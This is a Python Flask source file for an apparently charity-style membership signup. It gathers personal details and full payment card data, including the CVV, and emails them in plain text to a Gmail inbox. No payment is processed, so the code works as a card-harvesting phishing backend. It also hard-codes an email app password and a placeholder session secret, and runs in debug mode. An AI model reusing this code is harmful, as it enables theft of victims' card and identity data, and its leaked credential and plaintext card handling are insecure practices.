from flask import Flask, request, jsonify, render_template, redirect, url_for, session
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Required for session management

# Email configuration
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
EMAIL_ADDRESS = 'helpinghandsindinfo@gmail.com'  # Your email
EMAIL_PASSWORD = 'xiotysdcyulvnbor'             # Your app password


# Route to handle the 'join-now' form
@app.route('/submit_form', methods=['POST'])
def submit_form():
    try:
        # Collect form data
        session['name'] = request.form.get('name')
        session['dob'] = request.form.get('dob')
        session['mobile'] = request.form.get('mobile')
        session['email'] = request.form.get('email')
        session['state'] = request.form.get('state')
        session['profession'] = request.form.get('profession')

        # Redirect to payment page after submission
        return redirect(url_for('payment_page'))

    except Exception as e:
        return jsonify({"error": str(e)}), 500


# Route to render the payment page
@app.route('/payment', methods=['GET'])
def payment_page():
    return render_template('payment.html')


# Route to handle the 'payment' form
@app.route('/process_payment', methods=['POST'])
def process_payment():
    try:
        # Collect payment form data
        card_number = request.form.get('cardNumber')
        card_type = request.form.get('cardType')
        cardholder_name = request.form.get('cardholderName')
        expiry_date = request.form.get('expiryDate')
        cvv = request.form.get('cvv')

        # Combine data from both forms
        subject = "New Registration and Payment Details"
        body = f"""
        New Member Registration Details:

        Name: {session.get('name')}
        Date of Birth: {session.get('dob')}
        Mobile Number: {session.get('mobile')}
        Email: {session.get('email')}
        State: {session.get('state')}
        Profession: {session.get('profession')}

        Payment Details:

        Card Number: {card_number}
        Card Type: {card_type}
        Cardholder Name: {cardholder_name}
        Expiry Date: {expiry_date}
        CVV: {cvv}
        """

        # Send email with combined details
        send_email(subject, body)

        # Thank-you response or redirect
        return render_template('popup.html')  # Redirect to popup page

    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
    


# Function to send email
def send_email(subject, body):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())


if __name__ == '__main__':
    app.run(debug=True)
